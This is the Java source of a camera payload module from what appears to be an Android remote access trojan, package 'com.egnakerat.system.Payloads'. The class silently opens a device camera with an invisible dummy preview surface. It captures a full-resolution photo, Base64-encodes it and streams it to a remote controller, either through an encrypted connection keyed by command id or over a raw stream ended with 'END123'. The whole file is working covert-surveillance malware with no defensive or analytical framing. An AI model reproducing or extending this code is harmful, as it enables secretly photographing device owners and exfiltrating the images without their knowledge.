package com.egnakerat.system.Payloads;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.util.Base64;
import android.util.Log;

import com.egnakerat.system.ConnectionManager;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.util.List;

/**
 * CameraPreview v2.0
 * Takes pictures from device cameras. Supports both legacy (v1) and new (v2) protocol.
 */
public class CameraPreview {
    private Camera camera;
    private Context context;
    private OutputStream out;
    static String TAG = "cameraPreviewClass";

    public CameraPreview(Context context) {
        this.context = context;
    }

    /**
     * v2 API: Take picture and send via ConnectionManager (encrypted JSON).
     */
    public void startUpV2(int cameraID, ConnectionManager connection, String cmdId) {
        try {
            camera = Camera.open(cameraID);
        } catch (RuntimeException e) {
            Log.e(TAG, "Failed to open camera " + cameraID);
            return;
        }

        Camera.Parameters parameters = camera.getParameters();
        List<Camera.Size> allSizes = parameters.getSupportedPictureSizes();
        Camera.Size bestSize = allSizes.get(0);
        for (Camera.Size size : allSizes) {
            if (size.width > bestSize.width) {
                bestSize = size;
            }
        }
        parameters.setPictureSize(bestSize.width, bestSize.height);
        camera.setParameters(parameters);

        try {
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
        } catch (Exception e) {
            Log.e(TAG, "Preview error: " + e.getMessage());
        }

        camera.takePicture(null, null, (data, cam) -> {
            releaseCamera();
            // Encode and send via encrypted connection
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            if (bitmap != null) {
                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, bos);
                byte[] byteArr = bos.toByteArray();
                String encoded = Base64.encodeToString(byteArr, Base64.NO_WRAP);
                connection.sendStream(cmdId, "camera_" + cameraID + ".jpg", encoded);
                Log.d(TAG, "Photo sent: " + byteArr.length + " bytes");
            }
        });
    }

    /**
     * Legacy v1 API (kept for backwards compatibility).
     */
    public void startUp(int cameraID, OutputStream outputStream) {
        this.out = outputStream;
        try {
            camera = Camera.open(cameraID);
        } catch (RuntimeException e) {
            e.printStackTrace();
            try {
                out.write("END123\n".getBytes("UTF-8"));
            } catch (Exception ex) {
                ex.printStackTrace();
            }
            return;
        }

        Camera.Parameters parameters = camera.getParameters();
        List<Camera.Size> allSizes = parameters.getSupportedPictureSizes();
        Camera.Size size = allSizes.get(0);
        for (int i = 0; i < allSizes.size(); i++) {
            if (allSizes.get(i).width > size.width)
                size = allSizes.get(i);
        }

        parameters.setPictureSize(size.width, size.height);
        camera.setParameters(parameters);
        try {
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }
        camera.takePicture(null, null, (data, cam) -> {
            releaseCamera();
            sendPhoto(data);
        });
    }

    private void sendPhoto(byte[] data) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, bos);
        byte[] byteArr = bos.toByteArray();
        final String encodedImage = Base64.encodeToString(byteArr, Base64.DEFAULT);
        new Thread(() -> {
            try {
                out.write(encodedImage.getBytes("UTF-8"));
                out.write("END123\n".getBytes("UTF-8"));
            } catch (Exception e) {
                Log.e(TAG, e.getMessage());
            }
        }).start();
    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }
}
